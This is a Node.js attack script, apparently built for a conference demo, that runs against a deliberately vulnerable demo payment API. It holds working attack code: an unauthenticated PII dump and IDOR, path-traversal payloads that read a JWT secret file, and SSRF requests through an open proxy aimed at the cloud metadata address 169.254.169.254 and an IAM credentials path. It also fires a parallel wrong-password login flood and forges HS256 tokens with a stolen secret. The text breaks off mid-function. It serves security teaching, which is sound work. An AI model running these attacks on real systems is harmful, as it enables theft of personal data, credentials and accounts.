#!/usr/bin/env node
/**
 * VaultPay demo attacker — Short Conference Edition
 * =================================================
 *
 * Streamlined 5-phase high-impact conference demo:
 *   1. [Phase 01 · Reset] (optional via --reset)
 *   2. Unauthenticated data theft (users / IDOR / search / debug)
 *   3. Path traversal on /api/files (steals JWT_SECRET)
 *   4. Open proxy / SSRF on /api/proxy (cloud edge vs app security)
 *   5. Login flood / rate limiting (framework gap)
 *   6. Login, BOLA, mass assignment, & forged admin JWT (climax)
 *
 * Usage:
 *   node --no-warnings attack/attackv2.mjs <API_BASE_URL> --drama --projector --reset
 *   node --no-warnings attack/attackv2.mjs https://vaultpay-api.devlinduldulao.workers.dev --drama --projector --reset
 *
 * Flags:
 *   --drama       wait for Enter between phases (stage pacing)
 *   --projector   high-contrast colors, trimmed wire traces, spacious layout
 *   --reset       POST /api/demo/reset before attack (cleans warm isolates)
 *   --quiet       minimal output
 *   --verbose     show response payloads
 *   --json        machine-readable output at the end
 *   --skip-flood  skip concurrent login flood
 *   --gate=TOKEN  send X-VaultPay-Demo header
 *   --internal=URL base URL for SSRF stand-in
 */

import { createHmac } from "node:crypto";
import readline from "node:readline/promises";
import { stdin as input, stdout as output } from "node:process";

const rawArgs = process.argv.slice(2);
const flags = new Set(rawArgs.filter((a) => a.startsWith("--") && !a.includes("=")));
const positional = rawArgs.filter((a) => !a.startsWith("--"));
const targetArg = positional[0];

const quiet = flags.has("--quiet");
const verbose = flags.has("--verbose");
const drama = flags.has("--drama");
const projector = flags.has("--projector");
const asJson = flags.has("--json");
const skipFlood = flags.has("--skip-flood");
const doReset = flags.has("--reset");

/** Optional shared secret for gated public demos (server DEMO_GATE_TOKEN). */
let gateToken = process.env.DEMO_GATE_TOKEN || "";
let resetToken = process.env.DEMO_RESET_TOKEN || "";
/** SSRF stand-in target the API can reach but the attacker cannot. */
let internalService = process.env.INTERNAL_SERVICE_URL || "";
for (const a of rawArgs) {
    if (a.startsWith("--gate=")) gateToken = a.slice("--gate=".length);
    if (a.startsWith("--reset-token=")) resetToken = a.slice("--reset-token=".length);
    if (a.startsWith("--internal=")) internalService = a.slice("--internal=".length);
}
internalService = internalService.replace(/\/$/, "");

// Wire logging is ON by default for talks; --quiet turns it off.
// --projector keeps findings readable but trims per-request wire noise.
const showWire = !quiet && !projector;

if (!targetArg) {
    console.error(
        "Usage: node attackv2.mjs <API_BASE_URL> [--quiet] [--verbose] [--drama] [--projector] [--json] [--skip-flood] [--reset] [--gate=TOKEN] [--internal=URL]"
    );
    process.exit(2);
}

const BASE = targetArg.replace(/\/$/, "");
let baseUrl;
try {
    baseUrl = new URL(BASE);
} catch {
    console.error(`Invalid URL: ${targetArg}`);
    process.exit(2);
}

// ---------------------------------------------------------------------------
// Colors + console helpers (crafted for high contrast in dark & light terminals)
// ---------------------------------------------------------------------------
const isTTY = process.stdout.isTTY && !quiet;
const supports256 = isTTY && (typeof process.stdout.hasColors === "function" ? process.stdout.hasColors(256) : true);

// Dim gray that works on both dark (black) and light (white) background themes:
const dimCode = projector ? "" : isTTY ? (supports256 ? "\x1b[38;5;245m" : "\x1b[2m") : "";

const c = {
    reset: isTTY ? "\x1b[0m" : "",
    bold: isTTY ? "\x1b[1m" : "",
    dim: dimCode,
    red: isTTY ? (supports256 ? "\x1b[38;5;203m" : "\x1b[91m") : "",
    green: isTTY ? (supports256 ? "\x1b[38;5;40m" : "\x1b[92m") : "",
    yellow: isTTY ? (supports256 ? "\x1b[38;5;208m" : "\x1b[93m") : "",
    blue: isTTY ? (supports256 ? "\x1b[38;5;39m" : "\x1b[94m") : "",
    magenta: isTTY ? (supports256 ? "\x1b[38;5;171m" : "\x1b[95m") : "",
    cyan: isTTY ? (supports256 ? "\x1b[38;5;38m" : "\x1b[96m") : "",
    white: isTTY ? (supports256 ? "\x1b[38;5;231m" : "\x1b[97m") : "",
    bgRed: isTTY ? (supports256 ? "\x1b[48;5;196m" : "\x1b[41m") : "",
    bgGreen: isTTY ? (supports256 ? "\x1b[48;5;34m" : "\x1b[42m") : "",
    bgYellow: isTTY ? (supports256 ? "\x1b[48;5;208m" : "\x1b[43m") : "",
    bgBlue: isTTY ? (supports256 ? "\x1b[48;5;33m" : "\x1b[44m") : "",
    bgMagenta: isTTY ? (supports256 ? "\x1b[48;5;127m" : "\x1b[45m") : "",
};

const startedAt = Date.now();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

/**
 * Stage pacing: --drama waits for Enter between phases so you can talk over a frozen screen.
 */
const dramaPause = async () => {
    if (!drama) return;
    if (!input.isTTY) {
        await sleep(400);
        return;
    }
    const rl = readline.createInterface({ input, output });
    try {
        await rl.question(`  ${c.dim}[Enter] continue…${c.reset} `);
    } finally {
        rl.close();
    }
};

function banner() {
    console.log(`
${c.red}${c.bold}╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ██████╗ ███████╗███╗   ███╗ ██████╗                                ║
║   ██╔══██╗██╔════╝████╗ ████║██╔═══██╗                               ║
║   ██║  ██║█████╗  ██╔████╔██║██║   ██║                               ║
║   ██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║                               ║
║   ██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝                               ║
║   ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝                                ║
║                                                                      ║
║   JWT ≠ Secure API   ·   Conference 5-Phase Short Edition            ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
    console.log(`${c.bold}Target${c.reset}   ${c.cyan}${BASE}${c.reset}`);
    console.log(`${c.bold}Started${c.reset}  ${new Date().toISOString()}`);
    console.log(
        `${c.bold}Claim${c.reset}   JWT authenticates signed claims; authorization and safe application behavior still require explicit controls.`
    );
    console.log(
        `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "Enter" : "off"}  projector=${projector ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  reset=${doReset ? "on" : "off"}  gate=${gateToken ? "on" : "off"}  internal=${internalService || "none"}`
    );
    if (process.env.NODE_TLS_REJECT_UNAUTHORIZED === "0") {
        console.log(
            `${c.yellow}${c.bold}TLS${c.reset}     NODE_TLS_REJECT_UNAUTHORIZED=0 (corporate MITM / Zscaler — demo laptop only)`
        );
    }
    console.log(
        `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}${c.dim}  kind: framework-gap | misconfig | app-code${c.reset}\n`
    );
}

let phaseNo = 0;

function step(title) {
    phaseNo += 1;
    const n = String(phaseNo).padStart(2, "0");
    if (projector) console.log("");
    console.log(
        `\n${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
    );
    console.log(`${c.bold}${c.magenta}  PHASE ${n}  ·  ${title}${c.reset}`);
    console.log(
        `${c.bold}${c.magenta}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`
    );
    if (projector) console.log("");
}

function intent(msg) {
    console.log(`  ${c.bgBlue}${c.white}${c.bold} WHY  ${c.reset} ${msg}`);
}

function narrate(msg) {
    console.log(`  ${c.cyan}»${c.reset} ${msg}`);
}

function ok(msg) {
    console.log(`  ${c.green}✓ OK${c.reset}             ${msg}`);
}

function bad(msg) {
    console.log(`  ${c.red}✗ APP HOLE${c.reset}       ${msg}`);
}

function platform(msg) {
    console.log(`  ${c.yellow}◇ PLATFORM${c.reset}       ${msg}`);
}

function info(msg) {
    console.log(`  ${c.dim}· ${msg}${c.reset}`);
}

function loot(label, value) {
    const raw = String(value ?? "");
    const v = raw.length > 200 ? raw.slice(0, 200) + "…" : raw;
    console.log(
        `  ${c.bgRed}${c.white}${c.bold} LOOT ${c.reset} ${c.yellow}${c.bold}${label}${c.reset}  ${v}`
    );
}

function finding(severity, title, meta = {}) {
    const colors = {
        CRITICAL: c.red,
        HIGH: c.yellow,
        MEDIUM: c.blue,
        INFO: c.dim,
    };
    const color = colors[severity] || c.white;
    const owasp = meta.owasp ? ` ${c.dim}[${meta.owasp}:2023]${c.reset}` : "";
    const cwe = meta.cwe ? ` ${c.dim}[${meta.cwe}]${c.reset}` : "";
    const kind = meta.kind ? ` ${c.dim}(${meta.kind})${c.reset}` : "";
    console.log(`  ${color}${c.bold}[${severity}]${c.reset}${owasp}${cwe}${kind} ${title}`);
}

function scoreboard() {
    const by = stolen.findings.reduce((m, f) => {
        m[f.severity] = (m[f.severity] || 0) + 1;
        return m;
    }, {});
    const crit = by.CRITICAL || 0;
    const high = by.HIGH || 0;
    const med = by.MEDIUM || 0;
    const infoN = by.INFO || 0;
    console.log(
        `  ${c.dim}── scoreboard (cumulative finding records): ${c.red}${crit} critical${c.dim} · ${c.yellow}${high} high${c.dim} · ${c.blue}${med} medium${c.dim} · ${infoN} info · loot users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}${c.reset}`
    );
}

function previewBody(text, max = verbose ? 400 : 160) {
    if (!text) return "(empty)";
    const one = text.replace(/\s+/g, " ").trim();
    return one.length > max ? one.slice(0, max) + "…" : one;
}

function formatAuth(headers = {}) {
    const a = headers.Authorization || headers.authorization;
    if (!a) return "none";
    if (a.length <= 28) return a;
    return a.slice(0, 22) + "…" + a.slice(-8);
}

function statusColor(status) {
    if (status >= 200 && status < 300) return c.green;
    if (status >= 300 && status < 400) return c.yellow;
    if (status >= 400 && status < 500) return c.yellow;
    if (status >= 500) return c.red;
    return c.dim;
}

// ---------------------------------------------------------------------------
// HTTP with talk-friendly wire logs
// ---------------------------------------------------------------------------
let reqSeq = 0;

/**
 * @param {string} method
 * @param {string} path
 * @param {{ headers?: Record<string,string>, body?: unknown, timeoutMs?: number, label?: string, silent?: boolean }} [opts]
 */
async function http(method, path, opts = {}) {
    const {
        headers = {},
        body,
        timeoutMs = 15_000,
        label,
        silent = false,
    } = opts;

    const id = ++reqSeq;
    const payload = body !== undefined ? JSON.stringify(body) : undefined;
    const bytes = payload ? Buffer.byteLength(payload) : 0;

    if (showWire && !silent) {
        const tag = label ? ` ${c.dim}(${label})${c.reset}` : "";
        console.log(
            `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${id}${c.reset}${tag}  ${c.bold}${method}${c.reset} ${c.cyan}${path}${c.reset}`
        );
        console.log(
            `           ${c.dim}auth=${formatAuth(headers)}  body=${bytes ? bytes + " B" : "—"}  timeout=${timeoutMs}ms${c.reset}`
        );
        if (verbose && body && bytes < 2_000) {
            console.log(`           ${c.dim}json=${previewBody(JSON.stringify(body), 280)}${c.reset}`);
        } else if (verbose && body && bytes >= 2_000) {
            console.log(`           ${c.dim}json=(oversized payload, ${bytes} bytes)${c.reset}`);
        }
    }

    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeoutMs);
    const t0 = Date.now();
    try {
        const res = await fetch(`${BASE}${path}`, {
            method,
            headers: {
                Accept: "application/json, text/plain, */*",
                ...(payload !== undefined ? { "Content-Type": "application/json" } : {}),
                ...(gateToken ? { "X-VaultPay-Demo": gateToken } : {}),
                ...headers,
            },
            body: payload,
            redirect: "manual",
            signal: ctrl.signal,
        });
        const text = await res.text();
        const ms = Date.now() - t0;
        let json = null;
        try {
            json = JSON.parse(text);
        } catch {
            /* not json */
        }
        const headerObj = {};
        res.headers.forEach((v, k) => {
            headerObj[k.toLowerCase()] = v;
        });

        if (showWire && !silent) {
            const sc = statusColor(res.status);
            console.log(
                `  ${c.green}${c.bold}← RECV${c.reset}  ${c.bold}#${id}${c.reset}  ${sc}${c.bold}${res.status}${c.reset}  ${c.dim}${ms}ms  ${text.length} B${c.reset}`
            );
            if (headerObj.location) {
                console.log(`           ${c.dim}Location: ${headerObj.location}${c.reset}`);
            }
            if (verbose || res.status >= 500 || (json && (json.error || json.jwtSecret || json.stack))) {
                console.log(`           ${c.dim}body: ${previewBody(text)}${c.reset}`);
            } else if (showWire && text && text.length < 120) {
                console.log(`           ${c.dim}body: ${previewBody(text, 120)}${c.reset}`);
            }
        }

        return { status: res.status, headers: headerObj, text, json, ms, id };
    } catch (err) {
        const ms = Date.now() - t0;
        if (showWire && !silent) {
            console.log(
                `  ${c.red}${c.bold}← FAIL${c.reset}  ${c.bold}#${id}${c.reset}  ${c.red}${err.message}${c.reset}  ${c.dim}${ms}ms${c.reset}`
            );
        }
        throw err;
    } finally {
        clearTimeout(timer);
    }
}

function b64url(input) {
    return Buffer.from(input)
        .toString("base64")
        .replace(/=/g, "")
        .replace(/\+/g, "-")
        .replace(/\//g, "_");
}

function signHs256(payloadObj, secret) {
    const header = b64url(JSON.stringify({ alg: "HS256", typ: "JWT" }));
    const payload = b64url(JSON.stringify(payloadObj));
    const data = `${header}.${payload}`;
    const sig = createHmac("sha256", secret)
        .update(data)
        .digest("base64")
        .replace(/=/g, "")
        .replace(/\+/g, "-")
        .replace(/\//g, "_");
    return `${data}.${sig}`;
}

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------
const stolen = {
    users: [],
    orders: [],
    jwtSecret: null,
    token: null,
    loginUser: null,
    forgedAdminToken: null,
    escalated: false,
    findings: [],
    platformNotes: [],
};

function record(severity, title, detail, meta = {}) {
    const entry = {
        severity,
        title,
        detail,
        kind: meta.kind || "app-code",
        owasp: meta.owasp || null,
        cwe: meta.cwe || null,
        source: meta.source || "app",
    };
    stolen.findings.push(entry);
    finding(severity, title, entry);
    if (detail) info(detail);
    scoreboard();
}

function notePlatform(title, detail) {
    stolen.platformNotes.push({ title, detail });
    platform(title);
    if (detail) info(detail);
}

// ---------------------------------------------------------------------------
// Selected High-Impact Phases (Reset + 12, 07, 09, 06, 16)
// ---------------------------------------------------------------------------

/**
 * RESET · Demo reset — re-seed in-memory state (only when --reset)
 */
async function phaseReset() {
    if (!doReset) return;
    step("Demo reset — re-seed in-memory state");
    intent("Warm Worker/serverless isolates keep prior LOOT (Hijacked Bob). Reset before the reveal.");
    const res = await http("POST", "/api/demo/reset", {
        label: "demo-reset",
        headers: resetToken ? { "X-VaultPay-Reset": resetToken } : {},
    });
    if (res.status === 200 && res.json?.ok) {
        ok("Demo DB re-seeded (Alice/Bob/admin clean)");
    } else {
        info(`Reset → ${res.status} (DEMO_RESET_TOKEN may be required)`);
    }
}

/**
 * PHASE 12 · Unauthenticated data theft (users / IDOR / search / debug)
 */
async function phaseUnauthDataTheft() {
    step("Unauthenticated data theft (users / IDOR / search / debug)");
    intent("JWT claim: no password, no token — full PII. Authn was never applied.");

    narrate("Dumping /api/users with zero Authorization header…");
    const usersRes = await http("GET", "/api/users", { label: "user-dump" });
    if (usersRes.status === 200 && Array.isArray(usersRes.json?.users)) {
        stolen.users = usersRes.json.users;
        bad(`Returned ${stolen.users.length} full accounts without auth`);
        for (const u of stolen.users) {
            loot(
                `#${u.id} ${u.email}`,
                `role=${u.role} ssn=${u.ssn} card=${u.cardNumber} cvv=${u.cardCvv}`
            );
        }
        record(
            "CRITICAL",
            "Unauthenticated user dump",
            "No auth middleware on collection route — app left it public",
            { kind: "app-code", owasp: "API5" }
        );
    } else {
        ok(`GET /api/users → ${usersRes.status}`);
    }

    const id = stolen.users[0]?.id ?? 1;
    narrate(`IDOR: fetch /api/users/${id} still without auth…`);
    const one = await http("GET", `/api/users/${id}`, { label: "idor-user" });
    if (one.status === 200 && one.json?.user?.ssn) {
        bad(`Full PII for user #${id}`);
        loot("SSN", one.json.user.ssn);
        loot("card", one.json.user.cardNumber);
        loot("CVV", one.json.user.cardCvv);
        loot("note", one.json.user.internalNote);
        record(
            "CRITICAL",
            "IDOR on /api/users/:id without auth",
            "Walk the id space — no auth, no ownership check",
            { kind: "app-code", owasp: "API1" }
        );
    }

    narrate("Checking leftover debug endpoint…");
    const dbg = await http("GET", "/api/debug/config", { label: "debug-leak" });
    if (dbg.status === 200 && dbg.json?.jwtSecret) {
        stolen.jwtSecret = dbg.json.jwtSecret;
        bad("Debug config is public");
        loot("JWT_SECRET", stolen.jwtSecret);
        loot("featureFlags", JSON.stringify(dbg.json.featureFlags || {}));
        record(
            "CRITICAL",
            "Debug endpoint leaks JWT signing secret",
            "App left /api/debug/config public — forge any identity next",
            { kind: "app-code", owasp: "API8" }
        );
    }

    narrate('Searching PII with q="oslo"…');
    const search = await http("GET", "/api/search?q=oslo", { label: "pii-search" });
    if (search.status === 200 && (search.json?.results?.length || 0) > 0) {
        bad(`Search returned ${search.json.results.length} PII hits without auth`);
        for (const r of search.json.results) {
            loot(r.email, `${r.name} | ${r.address} | ${r.ssn}`);
        }
        record(
            "HIGH",
            "Unauthenticated PII search",
            "Search exposes sensitive object properties without filtering (API3), and lacks function access control (also API5).",
            { kind: "app-code", owasp: "API3" }
        );
    }
}

/**
 * PHASE 07 · Path traversal on /api/files (no login)
 */
async function phasePathTraversal() {
    step("Path traversal on /api/files (no login)");
    intent("App file endpoint joins user input with no jail — not an Express default.");
    narrate("First, read the intended public file…");
    const legit = await http("GET", "/api/files?name=welcome.txt", { label: "legit-file" });
    if (legit.status === 200 && /Welcome to VaultPay/i.test(legit.text)) {
        ok("welcome.txt is readable (expected)");
    } else {
        info(`welcome.txt → ${legit.status}`);
    }

    narrate("Now walk up directories into data/secrets/…");
    const attempts = ["../secrets/jwt-backup.txt", "..\\secrets\\jwt-backup.txt"];
    let hit = null;
    for (const t of attempts) {
        const res = await http("GET", `/api/files?name=${encodeURIComponent(t).replace(/%2F/gi, "/")}`, {
            label: `traverse:${t}`,
        });
        if (res.status === 200 && /JWT_SECRET=/.test(res.text)) {
            hit = { t, body: res.text };
            break;
        }
        const res2 = await http("GET", `/api/files?name=${t}`, { label: `traverse-raw:${t}` });
        if (res2.status === 200 && /JWT_SECRET=/.test(res2.text)) {
            hit = { t, body: res2.text };
            break;
        }
    }

    if (hit) {
        bad(`Path traversal succeeded with name=${hit.t}`);
        loot("secret-file", hit.body.replace(/\s+/g, " ").trim());
        const m = /JWT_SECRET=(\S+)/.exec(hit.body);
        if (m) {
            stolen.jwtSecret = stolen.jwtSecret || m[1];
            loot("JWT_SECRET", stolen.jwtSecret);
        }
        record(
            "CRITICAL",
            "Path traversal exposes virtual secret-file contents",
            "Demo in-memory VFS joins input without containment; no disk files were read. The hard-coded backup key may differ from the active signing key; JWT acceptance is tested separately.",
            { kind: "app-code", cwe: "CWE-22" }
        );
    } else {
        ok("Path traversal did not yield secrets (unexpected for this demo)");
    }
}

/** Classic cloud IMDS URL (demo teaching target — may fail on CF/Vercel). */
const AWS_IMDS_URL = "http://169.254.169.254/latest/meta-data/";

async function probeMetadataEgress(opts = { proxyAlive: true }) {
    if (!opts.proxyAlive) {
        info("Skipping IMDS probe — open proxy endpoint not available");
        return;
    }
    narrate(
        `Cloud-metadata style egress: open-proxy fetch of ${AWS_IMDS_URL} (classic EC2 IMDS — teaching target)…`
    );
    let meta;
    try {
        meta = await http("GET", `/api/proxy?url=${encodeURIComponent(AWS_IMDS_URL)}`, {
            timeoutMs: 8_000,
            label: "ssrf-imds",
        });
    } catch (err) {
        info(`IMDS probe transport error: ${err.message}`);
        info("Metadata reachability and the reason for failure are unconfirmed; no metadata finding recorded.");
        return;
    }

    const body = (meta.text || "").replace(/\s+/g, " ").trim();
    const proxyReportedFail =
        meta.status === 502 ||
        meta.status === 400 ||
        /Upstream fetch failed|ENOTFOUND|ECONNREFUSED|timeout|EHOSTUNREACH|ECONNRESET/i.test(body);

    const looksLikeImds =
        meta.status === 200 &&
        body.length > 0 &&
        !proxyReportedFail &&
        (/ami-id|instance-id|iam\/|meta-data|local-ipv4|public-ipv4|hostname/i.test(body) ||
            /^(ami-|i-)[a-z0-9-]+/i.test(body));

    if (looksLikeImds) {
        bad("Metadata-shaped response returned for link-local URL");
        loot("imds-snippet", body.slice(0, 160));
        record(
            "HIGH",
            "SSRF returns metadata-shaped content from link-local URL",
            "Response resembles metadata; this probe does not authenticate its source or retrieve usable IAM credentials. EC2 credential exposure depends on IMDS configuration and an attached role.",
            { kind: "app-code", owasp: "API7" }
        );
        return;
    }

    if (meta.status === 200 && body.length > 20 && !proxyReportedFail) {
        info(`Metadata URL returned HTTP 200 (${body.length} B); upstream identity unconfirmed`);
        loot("imds-body", body.slice(0, 120));
        info("No metadata-specific vulnerability recorded from an unrecognized response.");
        return;
    }

    info(
        `IMDS probe → status=${meta.status}; metadata reachability not demonstrated. Source inspection shows no app URL allowlist, but this response does not establish platform egress policy.`
    );
}

async function probeInternalPivot(opts = { proxyAlive: true }) {
    if (!internalService) return;
    if (!opts.proxyAlive) {
        info("Skipping internal-pivot probe — open proxy endpoint not available");
        return;
    }

    const credsPath = "/latest/meta-data/iam/security-credentials/vaultpay-demo-role";
    const internalUrl = `${internalService}${credsPath}`;

    narrate(`Reachability check: can WE fetch the same stand-in resource directly?`);
    let attackerReach = false;
    try {
        const direct = await fetch(internalUrl, {
            signal: AbortSignal.timeout(2500),
        });
        attackerReach = direct.ok;
    } catch {
        attackerReach = false;
    }
    if (attackerReach) {
        info("Laptop run: attacker and API share a host, so this service is reachable from here too");
        info("This run does not demonstrate a private-network boundary; the credentials are fabricated demo data");
    } else {
        info("Direct client fetch failed; this alone does not prove the service is internal-only");
    }

    narrate(`Asking the SERVER to fetch it instead: ${internalUrl}`);
    const pivot = await http("GET", `/api/proxy?url=${encodeURIComponent(internalUrl)}`, {
        timeoutMs: 8_000,
        label: "ssrf-internal",
    });
    const body = (pivot.text || "").replace(/\s+/g, " ").trim();
    if (pivot.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(body)) {
        bad("Server fetched the separate metadata stand-in and returned fabricated credentials");
        loot("internal-creds", body.slice(0, 180));
        record(
            "HIGH",
            "SSRF fetches metadata stand-in credentials",
            `Fabricated credentials from the separate demo service, not real IAM credentials. Direct client fetch ${attackerReach ? "also succeeded; no private-network boundary demonstrated" : "failed; network isolation remains unconfirmed"}.`,
            { kind: "app-code", owasp: "API7" }
        );
    } else {
        info(`Internal pivot → ${pivot.status} ${body.slice(0, 80)}`);
    }

    narrate("Now test redirect following within the same stand-in service (not an allowlist bypass)…");
    const hopUrl = `${internalService}/redirect?to=${encodeURIComponent(credsPath)}`;
    const hop = await http("GET", `/api/proxy?url=${encodeURIComponent(hopUrl)}`, {
        timeoutMs: 8_000,
        label: "ssrf-redirect-hop",
    });
    const hopBody = (hop.text || "").replace(/\s+/g, " ").trim();
    if (hop.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(hopBody)) {
        bad("Proxy followed the stand-in redirect and returned fabricated credentials");
        loot("hop-creds", hopBody.slice(0, 140));
        info("Additional evidence for the same proxy flaw; no new finding or allowlist bypass counted. Production SSRF defenses must validate every destination or disable redirects.");
    } else {
        info(`Redirect-hop probe → ${hop.status}`);
    }
}

/**
 * PHASE 09 · Open proxy / SSRF on /api/proxy (no login)
 */
async function phaseSsrfProxy() {
    step("Open proxy / SSRF on /api/proxy (no login)");
    intent(
        "Unrestricted server-side fetch(user URL): self-hit, arbitrary external, and cloud-metadata class. No egress policy in Express core — you must add one."
    );
    let proxyAlive = true;
    const loop = `${BASE}/api/debug/config`;
    narrate(`Asking the server to fetch its own debug config: ${loop}`);
    const res = await http("GET", `/api/proxy?url=${encodeURIComponent(loop)}`, {
        timeoutMs: 12_000,
        label: "ssrf-self",
    });
    if (res.status === 200 && /jwtSecret|supersecret/i.test(res.text)) {
        bad("Open proxy fetched own debug config and returned secrets");
        loot("ssrf-body", res.text.slice(0, 240));
        try {
            const j = JSON.parse(res.text);
            if (j.jwtSecret) {
                stolen.jwtSecret = stolen.jwtSecret || j.jwtSecret;
                loot("JWT_SECRET", stolen.jwtSecret);
            }
        } catch {
            /* ignore */
        }
        record(
            "CRITICAL",
            "SSRF proxy returns its public debug endpoint's secret",
            "Observed server-side self-fetch of the public BASE URL. This proves proxying the secret response, not access to an internal-only network destination.",
            { kind: "app-code", owasp: "API7" }
        );
    } else if (res.status === 200) {
        bad(`Open proxy returned 200 for self-URL (body may vary)`);
        record("HIGH", "Open proxy endpoint exists", res.text.slice(0, 120), {
            kind: "app-code",
            owasp: "API7",
        });
    } else if (res.status === 404 && /error code:\s*1042/i.test(res.text || "")) {
        notePlatform(
            "Self-fetch blocked by Cloudflare (error 1042) — not app authz",
            "Workers often refuse same-origin/self subrequests. The /api/proxy hole may still work for other URLs."
        );
        const external = "https://example.com/";
        narrate(`Fallback: open-proxy fetch of ${external}…`);
        const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
            timeoutMs: 12_000,
            label: "ssrf-external",
        });
        if (ext.status === 200 && /example|domain|illustrative/i.test(ext.text)) {
            bad("Server-side open proxy fetched an arbitrary external URL");
            loot("proxy-snippet", ext.text.replace(/\s+/g, " ").trim().slice(0, 120));
            record(
                "HIGH",
                "Open proxy: server fetches arbitrary URLs (SSRF surface)",
                "Self-target blocked by CF 1042; external target succeeded — open proxy, not a framework feature",
                { kind: "app-code", owasp: "API7" }
            );
        } else {
            info(`External proxy probe → ${ext.status} (self still CF-blocked)`);
        }
    } else if (res.status === 404 && /not found/i.test(res.text || "")) {
        ok("Open proxy route disabled (404)");
        proxyAlive = false;
    } else {
        info(`Self-proxy probe → ${res.status}`);
        const external = "https://example.com/";
        narrate(`Fallback: open-proxy fetch of ${external}…`);
        const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
            timeoutMs: 12_000,
            label: "ssrf-external",
        });
        if (ext.status === 200 && ext.text.length > 20) {
            bad("Server-side open proxy fetched an arbitrary external URL");
            record(
                "HIGH",
                "Open proxy: server fetches arbitrary URLs (SSRF surface)",
                "App /api/proxy with no allowlist",
                { kind: "app-code", owasp: "API7" }
            );
        } else if (ext.status === 404) {
            proxyAlive = false;
            ok("Open proxy route disabled (404)");
        } else {
            info(`External proxy probe → ${ext.status}`);
        }
    }

    await probeMetadataEgress({ proxyAlive });
    await probeInternalPivot({ proxyAlive });
}

/**
 * PHASE 06 · Login flood — observed authentication throttling
 */
async function phaseNoRateLimitFlood() {
    step("Login flood — observed authentication throttling");
    intent(
        "Express core has no login rate limiter. This bounded batch checks wrong-password attempts on one account; it cannot rule out other throttle thresholds or time windows."
    );
    if (skipFlood) {
        info("Skipped (--skip-flood)");
        return;
    }
    const N = 40;
    const idBefore = reqSeq;
    narrate(`Firing ${N} parallel POST /api/auth/login with wrong passwords…`);
    const t0 = Date.now();
    const results = await Promise.all(
        Array.from({ length: N }, (_, i) =>
            http("POST", "/api/auth/login", {
                body: { email: "alice@example.com", password: "wrong-password" },
                timeoutMs: 20_000,
                silent: true,
                label: `flood-${i}`,
            }).catch((e) => ({ status: 0, error: e.message, ms: 0 }))
        )
    );
    const ms = Date.now() - t0;
    const statuses = results.map((r) => r.status);
    const counted = statuses.reduce((m, s) => {
        m[s] = (m[s] || 0) + 1;
        return m;
    }, {});
    const got429 = statuses.filter((s) => s === 429).length;
    const got401 = results.filter((result) => result.status === 401 && result.json?.error === "Incorrect password").length;
    const idAfter = reqSeq;

    console.log(
        `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${idBefore + 1}–#${idAfter}${c.reset}  ${N}× parallel POST /api/auth/login  ${c.dim}(wire logs collapsed)${c.reset}`
    );
    console.log(
        `  ${c.green}${c.bold}← RECV${c.reset}  flood batch  finished in ${c.bold}${ms}ms${c.reset}  histogram=${JSON.stringify(counted)}`
    );

    if (got429 === 0 && got401 >= N * 0.7) {
        bad(`${got401}/${N} attempts returned the normal wrong-password error; zero 429 responses`);
        record(
            "HIGH",
            "No authentication throttling observed in this batch",
            `${got401}/${N} concurrent attempts returned Incorrect password, zero 429. Does not prove absence of all lockouts, delays, or longer-window limits. Resource-abuse risks also relate to API4.`,
            { kind: "framework-gap", owasp: "API2", cwe: "CWE-307" }
        );
    } else if (got429 > 0) {
        ok(`Server rate-limited some requests (${got429} × 429)`);
    } else {
        info(`Authentication throttle probe inconclusive: ${JSON.stringify(counted)}`);
    }
}

const DEMO_CREDENTIALS = [
    { email: "alice@example.com", password: "password123" },
    { email: "bob@example.com", password: "bobsecret" },
    { email: "admin@vaultpay.demo", password: "admin123" },
];

async function demoLogin() {
    for (const cred of DEMO_CREDENTIALS) {
        narrate(`Trying demo login ${cred.email}…`);
        const res = await http("POST", "/api/auth/login", {
            body: cred,
            label: `login:${cred.email}`,
        });
        if (res.status === 200 && res.json?.token) {
            return { ...cred, token: res.json.token, user: res.json.user };
        }
    }
    return null;
}

/**
 * PHASE 16 · Login, BOLA, mass assignment, admin, JWT forge
 */
async function phaseAuthzAndForgery() {
    step("Login, BOLA, mass assignment, admin, JWT forge");
    intent("JWT proves someone logged in. It does not decide what they may read or write.");

    const loginOk = await demoLogin();
    if (!loginOk) {
        bad("Could not login with demo credentials — skipping authz chain");
        return;
    }
    stolen.token = loginOk.token;
    stolen.loginUser = loginOk.user;
    ok(`Logged in as ${loginOk.email} (role=${loginOk.user.role})`);
    loot("token", loginOk.token);

    narrate("Fetching /api/orders with this user JWT — server should scope to self…");
    const orders = await http("GET", "/api/orders", {
        headers: { Authorization: `Bearer ${stolen.token}` },
        label: "bola-orders",
    });
    if (orders.status === 200 && Array.isArray(orders.json?.orders)) {
        stolen.orders = orders.json.orders;
        const others = new Set(
            stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
        );
        if (others.size > 0 && loginOk.user.role !== "admin") {
